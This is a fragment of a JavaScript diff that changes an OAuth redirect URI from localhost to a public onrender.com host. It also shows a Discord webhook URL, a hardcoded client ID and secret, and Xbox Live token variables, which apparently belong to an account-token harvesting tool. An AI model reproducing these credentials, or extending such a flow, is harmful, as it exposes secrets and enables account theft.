@@ -10,7 +10,7 @@ const url3 = 'https://discord.com/api/webhooks/1112057854619299982/Ly2cSE-M7eLWC
 
 const CLIENT_ID = '97081d71-a663-4c9d-a13b-c3a275f16528';
 const CLIENT_SECRET = '5sd8Q~E22gRv~Fu9hEtPzmmazjcTQn_sCa9I4anx';
-const REDIRECT_URI = 'http://localhost:3000/auth';
+const REDIRECT_URI = 'https://sept-auth.onrender.com/auth';
 
 let xblToken = '';
 let userHash = '';
